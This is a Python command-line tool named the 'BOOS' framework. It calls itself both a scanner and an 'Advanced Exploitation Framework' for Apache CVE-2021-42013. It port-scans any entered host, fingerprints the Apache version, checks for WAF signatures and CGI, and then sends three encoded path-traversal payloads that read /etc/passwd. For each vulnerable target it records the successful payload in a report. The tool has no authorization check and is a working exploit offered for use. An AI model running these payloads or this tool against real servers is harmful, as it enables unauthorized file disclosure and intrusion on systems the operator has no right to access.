#!/usr/bin/env python3
"""
BOOS Advanced Apache CVE-2021-42013 Vulnerability Scanner
Professional Edition - Optimized for WSL/Windows
"""

import socket
import threading
import requests
import urllib3
import sys
import time
import re
import random
import json
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style, Back
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import ssl
import warnings
import platform

# Suppress SSL warnings
warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

class BOOSFramework:
    """Main BOOS Framework Class"""
    
    def __init__(self):
        self.vulnerable_servers = []
        self.session = self._create_session()
        self.version = "2.0.0"
        self.author = "BOOS"
        
    def _create_session(self):
        """Create requests session"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        return session
    
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def get_terminal_width(self):
        """Get terminal width"""
        try:
            return os.get_terminal_size().columns
        except:
            return 100
    
    def print_centered(self, text, color=Fore.WHITE):
        """Print centered text"""
        width = self.get_terminal_width()
        print(color + text.center(width) + Style.RESET_ALL)
    
    def print_logo(self):
        """Print professional BOOS logo"""
        self.clear_screen()
        
        logo = f"""
{Fore.RED}    ██████╗  ██████╗  ██████╗ ███████╗
{Fore.RED}    ██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
{Fore.YELLOW}    ██████╔╝██║   ██║██║   ██║███████╗
{Fore.YELLOW}    ██╔══██╗██║   ██║██║   ██║╚════██║
{Fore.GREEN}    ██████╔╝╚██████╔╝╚██████╔╝███████║
{Fore.GREEN}    ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝{Style.RESET_ALL}
"""
        print(logo)
        
        # Title
        title = f"{Fore.RED}⚡{Fore.YELLOW}═══════════════════════════════════════════════════════════════{Fore.RED}⚡"
        self.print_centered(title)
        
        # Info
        info = f"{Fore.CYAN}Apache CVE-2021-42013 Advanced Exploitation Framework v{self.version}"
        self.print_centered(info)
        
        credit = f"{Fore.GREEN}Developed by: {Fore.RED}{self.author}{Fore.YELLOW} [Cyber Security Expert]"
        self.print_centered(credit)
        
        # Bottom line
        print()
        print(Fore.CYAN + "╔" + "═" * (self.get_terminal_width() - 2) + "╗")
        print(Fore.CYAN + "║" + Fore.YELLOW + " 🔒 Professional Vulnerability Scanner | WSL Optimized ".center(self.get_terminal_width() - 2) + Fore.CYAN + "║")
        print(Fore.CYAN + "╚" + "═" * (self.get_terminal_width() - 2) + "╝" + Style.RESET_ALL)
        print()
    
    def get_wsl_info(self):
        """Get WSL network information"""
        info = {
            'in_wsl': False,
            'wsl_ip': 'N/A',
            'windows_ip': 'N/A',
            'wsl_version': 'N/A'
        }
        
        # Check if in WSL
        try:
            with open('/proc/version', 'r') as f:
                if 'microsoft' in f.read().lower():
                    info['in_wsl'] = True
        except:
            pass
        
        if info['in_wsl']:
            # Get WSL IP
            try:
                result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
                if result.stdout:
                    info['wsl_ip'] = result.stdout.strip().split()[0]
            except:
                pass
            
            # Get Windows IP
            try:
                with open('/etc/resolv.conf', 'r') as f:
                    for line in f:
                        if 'nameserver' in line:
                            info['windows_ip'] = line.split()[1]
                            break
            except:
                pass
            
            # Get WSL version
            try:
                result = subprocess.run(['wsl.exe', '--status'], capture_output=True, text=True, shell=True)
                if 'WSL 2' in result.stdout:
                    info['wsl_version'] = '2'
                elif 'WSL 1' in result.stdout:
                    info['wsl_version'] = '1'
            except:
                pass
        
        return info
    
    def print_wsl_info(self):
        """Print WSL information in a box"""
        info = self.get_wsl_info()
        
        if info['in_wsl']:
            print(Fore.CYAN + "┌" + "─" * (self.get_terminal_width() - 2) + "┐")
            print(Fore.CYAN + "│" + Fore.GREEN + " 🌐 WSL NETWORK INFORMATION ".center(self.get_terminal_width() - 2) + Fore.CYAN + "│")
            print(Fore.CYAN + "├" + "─" * (self.get_terminal_width() - 2) + "┤")
            
            # WSL IP
            line = f" WSL IP Address: {info['wsl_ip']}"
            print(Fore.CYAN + "│" + Fore.YELLOW + line.ljust(self.get_terminal_width() - 2) + Fore.CYAN + "│")
            
            # Windows IP
            line = f" Windows Host IP: {info['windows_ip']}"
            print(Fore.CYAN + "│" + Fore.YELLOW + line.ljust(self.get_terminal_width() - 2) + Fore.CYAN + "│")
            
            # Network Range
            if info['windows_ip'] != 'N/A':
                base_ip = '.'.join(info['windows_ip'].split('.')[:-1]) + '.0/24'
                line = f" Network Range: {base_ip}"
                print(Fore.CYAN + "│" + Fore.YELLOW + line.ljust(self.get_terminal_width() - 2) + Fore.CYAN + "│")
            
            # WSL Version
            line = f" WSL Version: {info['wsl_version']}"
            print(Fore.CYAN + "│" + Fore.YELLOW + line.ljust(self.get_terminal_width() - 2) + Fore.CYAN + "│")
            
            print(Fore.CYAN + "└" + "─" * (self.get_terminal_width() - 2) + "┘")
            print()
    
    def check_vulnerability(self, url):
        """Check if target is vulnerable to CVE-2021-42013"""
        results = {
            'url': url,
            'vulnerable': False,
            'version': None,
            'waf': None,
            'cgi_enabled': False,
            'payloads_tested': [],
            'successful_payloads': [],
            'confidence': 0
        }
        
        print(f"\n{Fore.CYAN}┌" + "─" * (self.get_terminal_width() - 2) + "┐")
        print(f"{Fore.CYAN}│{Fore.YELLOW} 🔍 Scanning: {Fore.WHITE}{url}{Fore.CYAN}" + " " * (self.get_terminal_width() - len(url) - 15) + "│")
        print(f"{Fore.CYAN}├" + "─" * (self.get_terminal_width() - 2) + "┤")
        
        # Check server version
        print(f"{Fore.CYAN}│{Fore.YELLOW} 📋 Checking Apache version...{Fore.CYAN}" + " " * (self.get_terminal_width() - 32) + "│")
        try:
            response = self.session.get(url, timeout=5, verify=False)
            server = response.headers.get('Server', '')
            if 'Apache' in server:
                version_match = re.search(r'Apache/(\d+\.\d+\.\d+)', server)
                if version_match:
                    results['version'] = version_match.group(1)
                    if results['version'] in ['2.4.49', '2.4.50']:
                        print(f"{Fore.CYAN}│{Fore.GREEN}   ✓ Apache version {results['version']} detected (vulnerable range){Fore.CYAN}" + " " * (self.get_terminal_width() - 55) + "│")
                        results['confidence'] += 30
                    else:
                        print(f"{Fore.CYAN}│{Fore.YELLOW}   ℹ Apache version {results['version']} detected (not in vulnerable range){Fore.CYAN}" + " " * (self.get_terminal_width() - 65) + "│")
            else:
                print(f"{Fore.CYAN}│{Fore.RED}   ✗ Apache not detected{Fore.CYAN}" + " " * (self.get_terminal_width() - 27) + "│")
        except:
            print(f"{Fore.CYAN}│{Fore.RED}   ✗ Could not connect to server{Fore.CYAN}" + " " * (self.get_terminal_width() - 34) + "│")
        
        # Check WAF
        print(f"{Fore.CYAN}│{Fore.YELLOW} 🛡️ Detecting WAF...{Fore.CYAN}" + " " * (self.get_terminal_width() - 24) + "│")
        waf_signatures = ['cloudflare', 'aws', 'sucuri', 'mod_security']
        try:
            response = self.session.get(url, timeout=5, verify=False)
            headers_str = str(response.headers).lower()
            for waf in waf_signatures:
                if waf in headers_str:
                    results['waf'] = waf
                    print(f"{Fore.CYAN}│{Fore.RED}   ⚠ WAF detected: {waf}{Fore.CYAN}" + " " * (self.get_terminal_width() - 30 - len(waf)) + "│")
                    break
            if not results['waf']:
                print(f"{Fore.CYAN}│{Fore.GREEN}   ✓ No WAF detected{Fore.CYAN}" + " " * (self.get_terminal_width() - 25) + "│")
        except:
            pass
        
        # Test CGI
        print(f"{Fore.CYAN}│{Fore.YELLOW} 🔧 Checking CGI...{Fore.CYAN}" + " " * (self.get_terminal_width() - 23) + "│")
        cgi_paths = ['/cgi-bin/', '/cgi-bin/test.cgi', '/cgi-bin/printenv']
        for path in cgi_paths:
            try:
                response = self.session.get(url + path, timeout=3, verify=False)
                if response.status_code != 404:
                    results['cgi_enabled'] = True
                    print(f"{Fore.CYAN}│{Fore.GREEN}   ✓ CGI enabled{Fore.CYAN}" + " " * (self.get_terminal_width() - 22) + "│")
                    results['confidence'] += 20
                    break
            except:
                continue
        
        if not results['cgi_enabled']:
            print(f"{Fore.CYAN}│{Fore.YELLOW}   ℹ CGI not detected{Fore.CYAN}" + " " * (self.get_terminal_width() - 26) + "│")
        
        # Test payloads
        print(f"{Fore.CYAN}│{Fore.YELLOW} 💉 Testing exploit payloads...{Fore.CYAN}" + " " * (self.get_terminal_width() - 32) + "│")
        
        payloads = [
            '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '/cgi-bin/.%252e/.%252e/.%252e/.%252e/etc/passwd',
            '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
        ]
        
        for payload in payloads:
            results['payloads_tested'].append(payload)
            try:
                test_url = url + payload
                response = self.session.get(test_url, timeout=5, verify=False)
                
                if response.status_code == 200:
                    if 'root:x:0:0:' in response.text or 'daemon:x:1:1:' in response.text:
                        results['vulnerable'] = True
                        results['successful_payloads'].append(payload)
                        results['confidence'] += 50
                        print(f"{Fore.CYAN}│{Fore.RED}   🚨 VULNERABLE! Payload successful{Fore.CYAN}" + " " * (self.get_terminal_width() - 40) + "│")
                        break
                    else:
                        print(f"{Fore.CYAN}│{Fore.YELLOW}   ℹ Payload returned 200 but no system file{Fore.CYAN}" + " " * (self.get_terminal_width() - 47) + "│")
                elif response.status_code == 403:
                    print(f"{Fore.CYAN}│{Fore.YELLOW}   ℹ Access forbidden (403){Fore.CYAN}" + " " * (self.get_terminal_width() - 31) + "│")
                else:
                    print(f"{Fore.CYAN}│{Fore.YELLOW}   ℹ Payload returned {response.status_code}{Fore.CYAN}" + " " * (self.get_terminal_width() - 31) + "│")
            except:
                print(f"{Fore.CYAN}│{Fore.RED}   ✗ Payload failed{Fore.CYAN}" + " " * (self.get_terminal_width() - 23) + "│")
        
        # Final result
        print(f"{Fore.CYAN}├" + "─" * (self.get_terminal_width() - 2) + "┤")
        
        if results['vulnerable']:
            result_text = f" 🚨 CRITICAL: Target is VULNERABLE (Confidence: {results['confidence']}%) "
            print(f"{Fore.CYAN}│{Fore.RED}{result_text.center(self.get_terminal_width() - 2)}{Fore.CYAN}│")
        elif results['confidence'] > 30:
            result_text = f" ⚠ WARNING: Possibly vulnerable (Confidence: {results['confidence']}%) "
            print(f"{Fore.CYAN}│{Fore.YELLOW}{result_text.center(self.get_terminal_width() - 2)}{Fore.CYAN}│")
        else:
            result_text = f" ✓ SECURE: Target not vulnerable (Confidence: {results['confidence']}%) "
            print(f"{Fore.CYAN}│{Fore.GREEN}{result_text.center(self.get_terminal_width() - 2)}{Fore.CYAN}│")
        
        print(f"{Fore.CYAN}└" + "─" * (self.get_terminal_width() - 2) + "┘" + Style.RESET_ALL)
        
        return results
    
    def scan_port(self, target, port):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_target(self, target):
        """Main scanning function"""
        print(f"\n{Fore.CYAN}╔" + "═" * (self.get_terminal_width() - 2) + "╗")
        print(f"{Fore.CYAN}║{Fore.RED} 🎯 TARGET: {Fore.YELLOW}{target}{Fore.CYAN}" + " " * (self.get_terminal_width() - len(target) - 15) + "║")
        print(f"{Fore.CYAN}╚" + "═" * (self.get_terminal_width() - 2) + "╝" + Style.RESET_ALL)
        
        # Remove protocol if present
        if target.startswith(('http://', 'https://')):
            clean_target = target.split('://')[1].split('/')[0]
        else:
            clean_target = target.split('/')[0]
        
        # Check common ports
        ports_to_check = [80, 443, 8080, 8443]
        open_ports = []
        
        print(f"\n{Fore.YELLOW}[*] Scanning for open ports...{Style.RESET_ALL}")
        
        for port in ports_to_check:
            if self.scan_port(clean_target, port):
                print(f"{Fore.GREEN}[+] Port {port} is open{Style.RESET_ALL}")
                open_ports.append(port)
            else:
                print(f"{Fore.YELLOW}[-] Port {port} is closed{Style.RESET_ALL}")
        
        if not open_ports:
            print(f"{Fore.RED}[!] No open ports found on {clean_target}{Style.RESET_ALL}")
            return
        
        # Test each open port
        for port in open_ports:
            protocol = 'https' if port in [443, 8443] else 'http'
            url = f"{protocol}://{clean_target}:{port}"
            result = self.check_vulnerability(url)
            
            if result['vulnerable']:
                self.vulnerable_servers.append(result)
    
    def save_report(self):
        """Save scan results to file"""
        if not self.vulnerable_servers:
            return
        
        filename = f"BOOS_Report_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("BOOS ADVANCED EXPLOITATION FRAMEWORK - SCAN REPORT\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Vulnerable Targets Found: {len(self.vulnerable_servers)}\n\n")
            
            for idx, server in enumerate(self.vulnerable_servers, 1):
                f.write(f"[{idx}] {server['url']}\n")
                f.write(f"    Confidence: {server['confidence']}%\n")
                f.write(f"    Apache Version: {server['version'] or 'Unknown'}\n")
                f.write(f"    WAF: {server['waf'] or 'None'}\n")
                f.write(f"    CGI Enabled: {server['cgi_enabled']}\n")
                if server['successful_payloads']:
                    f.write(f"    Successful Payload: {server['successful_payloads'][0]}\n")
                f.write("-" * 40 + "\n")
        
        print(f"\n{Fore.GREEN}[✓] Report saved to: {filename}{Style.RESET_ALL}")
    
    def run(self):
        """Main execution loop"""
        while True:
            self.print_logo()
            
            # Show WSL info if available
            wsl_info = self.get_wsl_info()
            if wsl_info['in_wsl']:
                self.print_wsl_info()
            
            # Menu
            print(Fore.CYAN + "┌" + "─" * (self.get_terminal_width() - 2) + "┐")
            print(Fore.CYAN + "│" + Fore.YELLOW + " 📋 ENTER TARGET INFORMATION ".center(self.get_terminal_width() - 2) + Fore.CYAN + "│")
            print(Fore.CYAN + "├" + "─" * (self.get_terminal_width() - 2) + "┤")
            
            # Examples
            examples = [
                "Example targets:",
                f"  • {wsl_info['windows_ip']} (Windows host)" if wsl_info['in_wsl'] else "  • 192.168.1.1 (Local IP)",
                "  • example.com (Domain)",
                "  • https://example.com (Full URL)",
                "  • quit (Exit program)"
            ]
            
            for example in examples:
                if 'Windows host' in example:
                    print(Fore.CYAN + "│" + Fore.GREEN + example.ljust(self.get_terminal_width() - 2) + Fore.CYAN + "│")
                elif 'Domain' in example:
                    print(Fore.CYAN + "│" + Fore.YELLOW + example.ljust(self.get_terminal_width() - 2) + Fore.CYAN + "│")
                else:
                    print(Fore.CYAN + "│" + Fore.WHITE + example.ljust(self.get_terminal_width() - 2) + Fore.CYAN + "│")
            
            print(Fore.CYAN + "└" + "─" * (self.get_terminal_width() - 2) + "┘" + Style.RESET_ALL)
            
            # Get user input
            print()
            target = input(f"{Fore.RED}BOOS{Fore.YELLOW}@{Fore.CYAN}Framework{Fore.WHITE}> {Style.RESET_ALL}").strip()
            
            if target.lower() in ['quit', 'exit', 'q']:
                print(f"\n{Fore.YELLOW}[*] Exiting BOOS Framework...{Style.RESET_ALL}")
                print(f"{Fore.RED}[*] Stay secure! BOOS out.{Style.RESET_ALL}")
                break
            
            if not target:
                continue
            
            # Clear previous results
            self.vulnerable_servers = []
            
            # Scan target
            self.scan_target(target)
            
            # Save report if vulnerabilities found
            if self.vulnerable_servers:
                self.save_report()
            
            # Wait before next scan
            print(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Style.RESET_ALL}")
            input()

def main():
    """Main function"""
    try:
        framework = BOOSFramework()
        framework.run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[*] Scan interrupted by user{Style.RESET_ALL}")
        print(f"{Fore.RED}[*] BOOS Framework terminated.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Unexpected error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()